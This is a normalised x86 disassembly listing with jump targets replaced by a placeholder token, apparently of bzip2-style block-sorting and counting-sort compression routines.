mov ax [ ebx + eax * 2 + 0x24 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x6c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x26 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x78 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x28 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x84 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x2a ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x90 ]
mov ax [ ebx + eax * 2 + 0x2c ]
and eax 0xffff
xor edx edx
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x9c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x2e ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0xa8 ]
add esp 0x48
xor edx edx
mov ax [ ebx + eax * 2 + 0x30 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x6c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x32 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x78 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x34 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x84 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x36 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x90 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x38 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x9c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x3a ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0xa8 ]
add esp 0x48
mov ax [ ebx + eax * 2 + 0x3c ]
and eax 0xffff
xor edx edx
mov ecx [ ebp + eax * 4 ]
push ecx
mov dl [ edi + eax ]
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x6c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x3e ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x78 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x40 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x84 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x42 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x90 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x44 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x9c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x46 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0xa8 ]
add esp 0x48
xor edx edx
mov ax [ ebx + eax * 2 + 0x48 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x6c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x4a ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x78 ]
mov ax [ ebx + eax * 2 + 0x4c ]
and eax 0xffff
xor edx edx
mov ecx [ ebp + eax * 4 ]
push ecx
mov dl [ edi + eax ]
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x84 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x4e ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x90 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x50 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x9c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x52 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0xa8 ]
add esp 0x48
xor edx edx
mov ax [ ebx + eax * 2 + 0x54 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x6c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x56 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x78 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x58 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x84 ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x5a ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x90 ]
mov ax [ ebx + eax * 2 + 0x5c ]
and eax 0xffff
xor edx edx
mov ecx [ ebp + eax * 4 ]
push ecx
mov dl [ edi + eax ]
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x9c ]
xor edx edx
mov ax [ ebx + eax * 2 + 0x5e ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0xa8 ]
add esp 0x48
xor edx edx
mov ax [ ebx + eax * 2 + 0x60 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
mov eax [ esp + 0x2c ]
xor edx edx
mov ax [ ebx + eax * 2 ]
and eax 0xffff
mov ecx [ ebp + eax * 4 ]
mov dl [ edi + eax ]
push ecx
push edx
push esi
call sub_4114a0
add esp 0x18
jmp r-xdata
mov eax [ esi + 0x274 ]
cmp ebp eax
jge r-xdata
mov eax [ esp + 0x24 ]
xor ecx ecx
mov cl [ eax ]
xor eax eax
mov ax [ edi ]
lea edx [ ecx + 0x26 ]
add ecx 0x92
mov ebp edx
shl ebp 0x7
add ebp edx
lea edx [ eax + ebp * 2 ]
mov edx [ esi + edx * 4 ]
push edx
mov edx ecx
shl edx 0x7
add edx ecx
xor ecx ecx
lea eax [ eax + edx * 2 ]
mov cl [ eax + esi ]
push ecx
push esi
call sub_4114a0
mov eax [ esp + 0x6c ]
add esp 0xc
add edi 0x2
dec eax
mov [ esp + 0x60 ] eax
jne r-xdata
mov edi [ esp + 0x18 ]
sub_4133d0
sub esp 0x8
push ebx
push ebp
push esi
mov esi [ esp + 0x18 ]
push edi
mov eax [ esi + 0x20 ]
mov edi [ esi + 0x44 ]
mov edx [ esi + 0x24 ]
mov ebx [ esi + 0x18 ]
mov ebp [ esi + 0x268 ]
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x30 ]
cmp edi 0x2710
jl r-xdata
mov ecx [ esi + 0x14 ]
mov edx [ esi + 0x10 ]
push ebp
push edi
push ebx
push ecx
push edx
call sub_4134c0
add esp 0x14
lea ecx [ edi + 0x22 ]
test cl 0x1
je r-xdata
mov eax [ esi + 0x1c ]
cmp eax edi
pop edi
pop esi
pop ebp
pop ebx
jne r-xdata
mov edx [ esp + 0x10 ]
add ecx edx
cmp eax 0x1
mov [ esp + 0x14 ] ecx
jge r-xdata
inc ecx
add esp 0x8
retn
push 0x3eb
call sub_402720
add esp 0x4
mov [ esi + 0x1c ] eax
inc eax
add edx 0x4
cmp eax ecx
jl r-xdata
cmp eax 0x64
jle r-xdata
mov eax 0x1
jmp r-xdata
cmp [ edx ] 0x0
je r-xdata
jmp r-xdata
lea ecx [ eax - 0x1 ]
mov eax 0x55555556
imul ecx
mov eax edx
lea ecx [ esp + 0x1c ]
shr eax 0x1f
add edx eax
mov eax [ esi + 0x24 ]
imul edx edi
push ecx
mov [ esp + 0x20 ] edx
mov edx [ esp + 0x18 ]
push ebp
push edi
push ebx
push edx
push eax
mov eax [ esp + 0x28 ]
push eax
call sub_413c80
mov eax [ esp + 0x38 ]
add esp 0x1c
test eax eax
jge r-xdata
mov eax 0x64
mov ecx [ esi + 0x44 ]
or edi 0xffffffff
xor eax eax
mov [ esi + 0x1c ] edi
test ecx ecx
jle r-xdata
sub_4134c0
sub esp 0x810
mov ecx 0x101
xor eax eax
push ebx
push ebp
mov ebp [ esp + 0x828 ]
push esi
push edi
lea edi [ esp + 0x1c ]
test ebp ebp
[ edi ]
jle r-xdata
mov ecx 0x100
lea esi [ esp + 0x1c ]
lea edi [ esp + 0x420 ]
lea eax [ esp + 0x20 ]
[ edi ] [ esi ]
mov ecx 0x100
mov edx [ esp + 0x828 ]
xor ecx ecx
mov cl [ eax + edx ]
mov esi [ esp + ecx * 4 + 0x1c ]
lea ecx [ esp + ecx * 4 + 0x1c ]
inc esi
inc eax
cmp eax ebp
mov [ ecx ] esi
jl r-xdata
mov edx [ eax - 0x4 ]
mov edi [ eax ]
add edi edx
mov [ eax ] edi
add eax 0x4
dec ecx
jne r-xdata
xor ecx ecx
test ebp ebp
jle r-xdata
mov eax ebp
mov esi [ esp + 0x82c ]
cdq
and edx 0x1f
add eax edx
sar eax 0x5
add eax 0x2
test eax eax
jle r-xdata
mov edx [ esp + 0x828 ]
xor eax eax
mov al [ ecx + edx ]
lea edx [ esp + eax * 4 + 0x1c ]
mov eax [ esp + eax * 4 + 0x1c ]
dec eax
mov [ edx ] eax
mov edx [ esp + 0x824 ]
mov [ edx + eax * 4 ] ecx
inc ecx
cmp ecx ebp
jl r-xdata
lea edx [ esp + 0x1c ]
mov edi 0x100
mov ecx eax
xor eax eax
mov edi esi
[ edi ]
mov ecx [ edx ]
mov ebx 0x1
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ebx cl
mov ecx [ esi + eax * 4 ]
lea eax [ esi + eax * 4 ]
add edx 0x4
or ecx ebx
dec edi
mov [ eax ] ecx
jne r-xdata
mov eax ebp
mov edi 0x20
mov ecx eax
mov ebx 0x1
sar ecx 0x5
lea edx [ esi + ecx * 4 ]
mov ecx eax
and ecx 0x1f
shl ebx cl
mov ecx [ edx ]
or ecx ebx
mov ebx 0x1
mov [ edx ] ecx
lea ecx [ eax + 0x1 ]
mov edx ecx
and ecx 0x1f
sar edx 0x5
shl ebx cl
mov ecx [ esi + edx * 4 ]
lea edx [ esi + edx * 4 ]
add eax 0x2
not ebx
and ecx ebx
dec edi
mov [ edx ] ecx
jne r-xdata
mov [ esp + 0x10 ] 0x1
mov [ esp + 0x14 ] 0x0
or edi 0xffffffff
mov edx [ esp + 0x824 ]
mov ecx eax
mov edi 0x1
sar ecx 0x5
mov edx [ esi + ecx * 4 ]
mov ecx eax
and ecx 0x1f
shl edi cl
test edx edi
je r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx ]
mov ebx [ esp + 0x10 ]
sub ecx ebx
jns r-xdata
mov edi eax
lea ebx [ eax - 0x1 ]
cmp ebx ebp
jge r-xdata
cmp edx 0xffffffff
jne r-xdata
inc eax
mov edi 0x1
mov ecx eax
mov edx eax
and ecx 0x1f
sar edx 0x5
shl edi cl
test [ esi + edx * 4 ] edi
jne r-xdata
mov ebx [ esp + 0x828 ]
inc eax
add edx 0x4
cmp eax ebp
mov [ ebx + ecx * 4 ] edi
jl r-xdata
add ecx ebp
mov edx [ esp + 0x10 ]
lea eax [ edx + edx ]
cmp eax ebp
mov [ esp + 0x10 ] eax
jg r-xdata
mov ecx eax
mov edi 0x1
and ecx 0x1f
mov edx eax
shl edi cl
sar edx 0x5
test [ esi + edx * 4 ] edi
jne r-xdata
mov ecx eax
mov edx 0x1
and ecx 0x1f
shl edx cl
mov ecx eax
sar ecx 0x5
test [ esi + ecx * 4 ] edx
je r-xdata
add eax 0x20
mov edx eax
sar edx 0x5
cmp [ esi + edx * 4 ] 0xffffffff
je r-xdata
mov ecx eax
mov ebx 0x1
and ecx 0x1f
shl ebx cl
mov ecx eax
sar ecx 0x5
test [ esi + ecx * 4 ] ebx
je r-xdata
xor eax eax
test ebp ebp
jle r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
mov ecx eax
mov edi 0x1
sar ecx 0x5
mov edx [ esi + ecx * 4 ]
mov ecx eax
and ecx 0x1f
shl edi cl
test edx edi
jne r-xdata
test ecx ecx
je r-xdata
inc eax
mov edx 0x1
mov ecx eax
and ecx 0x1f
shl edx cl
mov ecx eax
sar ecx 0x5
test [ esi + ecx * 4 ] edx
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x810
retn
mov edx [ esp + 0x824 ]
mov esi ebp
xor edi edi
xor eax eax
test ebp ebp
jle r-xdata
lea edi [ eax - 0x1 ]
cmp edi ebp
jge r-xdata
test edx edx
jne r-xdata
inc eax
mov edi 0x1
mov ecx eax
mov edx eax
and ecx 0x1f
shl edi cl
sar edx 0x5
test [ esi + edx * 4 ] edi
je r-xdata
mov ebx [ esp + eax * 4 + 0x420 ]
mov ecx [ edx ]
mov edi [ esp + 0x828 ]
dec ebx
add edx 0x4
dec esi
mov [ esp + eax * 4 + 0x420 ] ebx
mov [ ecx + edi ] al
jne r-xdata
mov edi [ ecx + 0x4 ]
add ecx 0x4
inc eax
test edi edi
je r-xdata
cmp edi ebx
jle r-xdata
mov ecx eax
mov edx 0x1
and ecx 0x1f
shl edx cl
mov ecx eax
sar ecx 0x5
test [ esi + ecx * 4 ] edx
jne r-xdata
add eax 0x20
mov edx eax
sar edx 0x5
cmp [ esi + edx * 4 ] 0x0
je r-xdata
mov edi [ esp + eax * 4 + 0x420 ]
lea ecx [ esp + eax * 4 + 0x420 ]
test edi edi
jne r-xdata
cmp eax 0x100
jl r-xdata
lea eax [ edi + 0x1 ]
mov edi 0x1
mov ecx eax
mov edx eax
and ecx 0x1f
sar edx 0x5
shl edi cl
test [ esi + edx * 4 ] edi
je r-xdata
mov eax [ esp + 0x14 ]
mov edx edi
sub edx ebx
push edi
push ebx
lea ecx [ eax + edx + 0x1 ]
mov edx [ esp + 0x830 ]
mov eax [ esp + 0x82c ]
push edx
push eax
mov [ esp + 0x24 ] ecx
call sub_413890
add esp 0x10
or ecx 0xffffffff
cmp ebx edi
mov eax ebx
jg r-xdata
inc eax
mov edx 0x1
mov ecx eax
and ecx 0x1f
shl edx cl
mov ecx eax
sar ecx 0x5
test [ esi + ecx * 4 ] edx
je r-xdata
push 0x3ed
call sub_402720
add esp 0x4
mov edx [ esp + 0x824 ]
lea ebx [ edx + ebx * 4 ]
mov [ esp + 0x18 ] ebx
mov ebx [ esp + 0x18 ]
inc eax
add ebx 0x4
cmp eax edi
mov [ esp + 0x18 ] ebx
jle r-xdata
mov ecx eax
mov ebp 0x1
sar ecx 0x5
lea edx [ esi + ecx * 4 ]
mov ecx eax
and ecx 0x1f
shl ebp cl
mov ecx [ edx ]
or ecx ebp
mov ebp [ esp + 0x830 ]
mov [ edx ] ecx
mov ecx ebx
mov edx [ ebx ]
mov ebx [ esp + 0x828 ]
mov ebx [ ebx + edx * 4 ]
cmp ecx ebx
je r-xdata
jmp r-xdata
sub_413890
sub esp 0x348
mov eax [ esp + 0x354 ]
mov ecx [ esp + 0x358 ]
push ebx
push ebp
mov ebp [ esp + 0x354 ]
push esi
push edi
xor esi esi
mov [ esp + 0x1c8 ] eax
mov [ esp + 0x38 ] ecx
mov [ esp + 0x14 ] 0x1
lea ebx [ esp + 0x3c ]
lea edi [ esp + 0x1cc ]
jmp r-xdata
cmp [ esp + 0x14 ] 0x64
jl r-xdata
mov ecx [ esp + 0x14 ]
sub ebx 0x4
sub edi 0x4
mov [ esp + 0x20 ] ebx
mov ebx [ ebx ]
mov [ esp + 0x24 ] edi
mov edi [ edi ]
mov edx ebx
sub edx edi
dec ecx
cmp edx 0xa
mov [ esp + 0x14 ] ecx
mov [ esp + 0x2c ] edi
mov [ esp + 0x34 ] ebx
jge r-xdata
push 0x3ec
call sub_402720
add esp 0x4
mov eax esi
xor edx edx
shl eax 0x7
sub eax esi
lea eax [ eax + eax * 2 ]
lea ecx [ eax + eax * 4 ]
lea eax [ esi + ecx * 4 + 0x1 ]
mov ecx 0x3
and eax 0x7fff
mov [ esp + 0x28 ] eax
div ecx
test edx edx
jne r-xdata
mov eax [ esp + 0x360 ]
push ebx
push edi
push eax
push ebp
call sub_413ba0
add esp 0x10
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ ebp + edi * 4 ]
mov eax [ esp + 0x360 ]
mov ecx [ eax + edx * 4 ]
mov [ esp + 0x1c ] ecx
jmp r-xdata
mov eax [ esp + 0x14 ]
test eax eax
jg r-xdata
mov eax [ ebp + ebx * 4 ]
lea edx [ ebx + edi ]
sar edx 0x1
mov eax [ ebp + edx * 4 ]
jmp r-xdata
mov [ esp + 0x10 ] edi
mov [ esp + 0x18 ] ebx
mov ebx [ esp + 0x20 ]
mov edi [ esp + 0x24 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x348
retn
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x18 ]
cmp eax edx
jl r-xdata
mov edx [ eax ]
mov ecx [ esp + 0x360 ]
mov ebp [ esp + 0x1c ]
mov ecx [ ecx + edx * 4 ]
sub ecx ebp
jne r-xdata
mov ecx [ esp + 0x360 ]
mov edx [ ecx + eax * 4 ]
mov [ esp + 0x1c ] edx
mov esi [ esp + 0x28 ]
mov esi [ esp + 0x2c ]
mov eax edi
sub eax edx
sub edx esi
cmp edx eax
mov [ esp + 0x30 ] eax
jl r-xdata
test ecx ecx
jg r-xdata
mov ecx [ esi ]
mov ebp [ esp + 0x35c ]
mov [ eax ] ecx
mov ecx [ esp + 0x10 ]
mov [ esi ] edx
inc ecx
add esi 0x4
inc edi
mov [ esp + 0x10 ] ecx
add eax 0x4
jmp r-xdata
test edx edx
jle r-xdata
mov edx eax
mov ebp [ esp + 0x35c ]
mov edx [ esp + 0x18 ]
lea esi [ ebp + edx * 4 ]
lea eax [ ebp + ebx * 4 ]
mov ebp [ esp + 0x35c ]
inc edi
add eax 0x4
jmp r-xdata
cmp edi ebx
jg r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x18 ]
mov ecx edx
sub eax ebx
sub ecx [ esp + 0x18 ]
cmp ecx eax
jl r-xdata
mov ecx edi
lea eax [ ebp + esi * 4 ]
sub ecx edx
mov [ esp + 0x10 ] edx
lea ecx [ ebp + ecx * 4 ]
mov edx [ eax ]
mov ecx [ esp + 0x360 ]
mov ebp [ esp + 0x1c ]
mov ecx [ ecx + edx * 4 ]
sub ecx ebp
jne r-xdata
test ecx ecx
jle r-xdata
mov ecx eax
mov edx [ eax ]
add eax 0x4
mov [ esp + 0x1c ] edx
mov edx [ ecx ]
mov [ eax - 0x4 ] edx
mov edx [ esp + 0x1c ]
mov [ ecx ] edx
mov edx [ esp + 0x10 ]
add ecx 0x4
dec edx
mov [ esp + 0x10 ] edx
jne r-xdata
test ecx ecx
jl r-xdata
mov ecx [ esi ]
mov ebp [ esp + 0x35c ]
mov [ eax ] ecx
mov ecx [ esp + 0x18 ]
mov [ esi ] edx
dec ecx
sub esi 0x4
dec ebx
mov [ esp + 0x18 ] ecx
sub eax 0x4
jmp r-xdata
mov ecx [ esp + 0x30 ]
mov eax [ esp + 0x18 ]
sub ebx eax
mov eax edx
lea edi [ ecx + esi - 0x1 ]
lea ebx [ ebx + edx + 0x1 ]
mov ecx edi
sub eax ebx
sub ecx esi
cmp ecx eax
jle r-xdata
mov eax edx
lea edi [ ebp + edi * 4 ]
sub eax ecx
mov [ esp + 0x10 ] ecx
lea eax [ ebp + eax * 4 + 0x4 ]
mov ebp [ esp + 0x35c ]
cmp edi ebx
jg r-xdata
mov ebp [ esp + 0x35c ]
dec ebx
sub eax 0x4
jmp r-xdata
cmp edi ebx
jg r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x14 ]
add ecx 0x4
mov [ eax ] ebx
add eax 0x4
inc edx
mov [ ecx ] edi
mov [ eax ] esi
inc edx
add eax 0x4
add ecx 0x4
mov [ esp + 0x14 ] edx
mov [ esp + 0x24 ] eax
mov [ esp + 0x20 ] ecx
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x24 ]
mov esi [ esp + 0x14 ]
add ecx 0x4
mov [ eax ] edi
add eax 0x4
inc esi
mov [ ecx ] ebx
mov [ eax ] edx
inc esi
add ecx 0x4
add eax 0x4
mov [ esp + 0x14 ] esi
mov [ esp + 0x24 ] ecx
mov [ esp + 0x20 ] eax
jmp r-xdata
mov esi [ eax ]
mov ecx [ edi ]
mov [ edi ] esi
mov [ eax ] ecx
mov ecx [ esp + 0x10 ]
add edi 0x4
add eax 0x4
dec ecx
mov [ esp + 0x10 ] ecx
jne r-xdata
mov esi [ esp + 0x2c ]
mov edx [ ebp + ebx * 4 ]
mov eax [ ebp + edi * 4 ]
mov [ ebp + edi * 4 ] edx
mov [ ebp + ebx * 4 ] eax
inc edi
dec ebx
jmp r-xdata
mov eax [ esp + 0x10 ]
lea esi [ ebp + eax * 4 ]
lea eax [ ebp + edi * 4 ]
sub_413ba0
mov eax [ esp + 0xc ]
push ebx
push ebp
push esi
mov esi [ esp + 0x1c ]
push edi
cmp eax esi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebp [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov ecx esi
sub ecx eax
cmp ecx 0x3
jle r-xdata
lea edi [ esi - 0x1 ]
cmp edi eax
jl r-xdata
lea edi [ esi - 0x4 ]
cmp edi eax
jl r-xdata
lea ecx [ edx + edi * 4 ]
mov [ esp + 0x18 ] ecx
lea ecx [ edx + edi * 4 ]
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x20 ]
dec edi
mov [ ecx + eax * 4 - 0x4 ] edx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
sub ecx 0x4
cmp edi eax
mov [ esp + 0x18 ] ecx
jge r-xdata
add ecx 0x4
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x20 ]
dec edi
mov [ edx + eax * 4 - 0x10 ] ecx
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x1c ]
sub ecx 0x4
cmp edi eax
mov [ esp + 0x18 ] ecx
jge r-xdata
add ecx 0x10
mov eax [ ecx ]
mov [ esp + 0x20 ] eax
mov ebx [ ebp + eax * 4 ]
lea eax [ edi + 0x1 ]
cmp eax esi
jg r-xdata
mov [ ecx - 0x4 ] edx
inc eax
add ecx 0x4
cmp eax esi
jle r-xdata
mov eax [ ecx ]
mov [ esp + 0x20 ] eax
mov ebx [ ebp + eax * 4 ]
lea eax [ edi + 0x4 ]
cmp eax esi
jg r-xdata
mov [ ecx - 0x10 ] edx
add eax 0x4
add ecx 0x10
cmp eax esi
jle r-xdata
mov edx [ ecx ]
cmp ebx [ ebp + edx * 4 ]
jbe r-xdata
mov edx [ ecx ]
cmp ebx [ ebp + edx * 4 ]
jbe r-xdata
sub_413c80
sub esp 0xd2c
mov ecx 0x10001
push ebx
push ebp
push esi
mov esi [ esp + 0xd48 ]
push edi
lea eax [ esi + 0x40000 ]
mov [ eax ] 0x0
sub eax 0x4
dec ecx
jne r-xdata
mov ebx [ esp + 0xd50 ]
mov ebp [ esp + 0xd44 ]
xor ecx ecx
mov ch [ ebp ]
lea eax [ ebx - 0x1 ]
cmp eax 0x3
jl r-xdata
test eax eax
jl r-xdata
mov edx [ esp + 0xd48 ]
lea edi [ edx + eax * 2 - 0x4 ]
mov ecx [ esp + 0xd48 ]
xor eax eax
lea edi [ ebx + ebp ]
lea ecx [ ecx + ebx * 2 ]
mov edx [ esp + 0xd48 ]
lea edi [ edx + eax * 2 ]
xor edx edx
xor ebx ebx
mov [ edi + 0x4 ] dx
mov bh [ eax + ebp ]
sar ecx 0x8
or ecx ebx
sub eax 0x4
sub edi 0x8
mov ebx [ esi + ecx * 4 ]
inc ebx
mov [ esi + ecx * 4 ] ebx
xor ebx ebx
mov [ edi + 0xa ] dx
mov bh [ eax + ebp + 0x3 ]
sar ecx 0x8
or ecx ebx
mov ebx [ esi + ecx * 4 ]
inc ebx
mov [ esi + ecx * 4 ] ebx
xor ebx ebx
mov [ edi + 0x8 ] dx
mov bh [ eax + ebp + 0x2 ]
sar ecx 0x8
or ecx ebx
mov ebx [ esi + ecx * 4 ]
inc ebx
mov [ esi + ecx * 4 ] ebx
mov [ edi + 0x6 ] dx
mov dh [ eax + ebp + 0x1 ]
sar ecx 0x8
or ecx edx
mov ebx [ esi + ecx * 4 ]
inc ebx
cmp eax 0x3
mov [ esi + ecx * 4 ] ebx
jge r-xdata
mov ebx [ esp + 0xd50 ]
mov dl [ eax + ebp ]
add ecx 0x2
mov [ edi + eax ] dl
mov [ ecx - 0x2 ] 0x0
inc eax
cmp eax 0x22
jl r-xdata
lea eax [ esi + 0x4 ]
mov ecx 0x10000
xor edx edx
mov [ edi ] 0x0
mov dh [ eax + ebp ]
sub edi 0x2
sar ecx 0x8
or ecx edx
mov edx [ esi + ecx * 4 ]
inc edx
dec eax
test eax eax
mov [ esi + ecx * 4 ] edx
jge r-xdata
mov edx [ eax - 0x4 ]
mov edi [ eax ]
add edi edx
mov [ eax ] edi
add eax 0x4
dec ecx
jne r-xdata
lea eax [ ebx - 0x1 ]
xor edx edx
mov dh [ ebp ]
cmp eax 0x3
jl r-xdata
test eax eax
jl r-xdata
xor ecx ecx
mov ch [ eax + ebp ]
mov cl dh
mov edx ecx
and ecx 0xffff
lea edi [ esi + ecx * 4 ]
mov ecx [ esi + ecx * 4 ]
dec ecx
mov [ edi ] ecx
mov edi [ esp + 0xd40 ]
mov [ edi + ecx * 4 ] eax
xor ecx ecx
mov ch [ eax + ebp - 0x1 ]
mov cl dh
mov edx ecx
and ecx 0xffff
lea ebx [ esi + ecx * 4 ]
mov ecx [ esi + ecx * 4 ]
dec ecx
mov [ ebx ] ecx
lea ebx [ eax - 0x1 ]
mov [ edi + ecx * 4 ] ebx
xor ecx ecx
mov ch [ eax + ebp - 0x2 ]
mov cl dh
mov edx ecx
and ecx 0xffff
lea ebx [ esi + ecx * 4 ]
mov ecx [ esi + ecx * 4 ]
dec ecx
mov [ ebx ] ecx
lea ebx [ eax - 0x2 ]
mov [ edi + ecx * 4 ] ebx
xor ecx ecx
mov ch [ eax + ebp - 0x3 ]
mov cl dh
mov edx ecx
and ecx 0xffff
lea ebx [ esi + ecx * 4 ]
mov ecx [ esi + ecx * 4 ]
dec ecx
mov [ ebx ] ecx
lea ebx [ eax - 0x3 ]
sub eax 0x4
mov [ edi + ecx * 4 ] ebx
cmp eax 0x3
jge r-xdata
xor edx edx
mov ecx 0x40
xor eax eax
lea edi [ esp + 0x3c ]
lea ebx [ esp + 0x13c ]
[ edi ]
xor ecx ecx
mov ch [ eax + ebp ]
mov cl dh
mov edx ecx
and ecx 0xffff
lea edi [ esi + ecx * 4 ]
mov ecx [ esi + ecx * 4 ]
dec ecx
mov [ edi ] ecx
mov edi [ esp + 0xd40 ]
mov [ edi + ecx * 4 ] eax
dec eax
jns r-xdata
mov [ ebx ] edx
inc edx
add ebx 0x4
cmp edx 0xff
jle r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ eax + eax * 2 + 0x1 ]
cmp eax 0x100
mov [ esp + 0x14 ] eax
jle r-xdata
mov eax [ esp + 0x14 ]
mov eax 0x55555556
imul [ esp + 0x14 ]
mov eax edx
shr eax 0x1f
add edx eax
cmp edx 0xff
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] edx
jg r-xdata
cmp edx 0x1
jne r-xdata
lea ecx [ edx * 4 ]
mov ebx ecx
mov [ esp + 0x10 ] ebx
xor eax eax
lea ecx [ esp + 0x13c ]
mov [ esp + 0x2c ] eax
mov [ esp + 0x18 ] eax
mov [ esp + 0x28 ] ecx
mov edi [ esp + 0x18 ]
mov eax [ esp + 0x20 ]
add ebx 0x4
inc edi
cmp ebx 0x3fc
mov [ esp + ebp * 4 + 0x13c ] eax
mov [ esp + 0x18 ] edi
mov [ esp + 0x10 ] ebx
jle r-xdata
mov eax ebx
inc eax
cmp eax 0xff
mov [ esp + 0x10 ] eax
jle r-xdata
mov ebp edx
shl ebp 0x8
add ebp eax
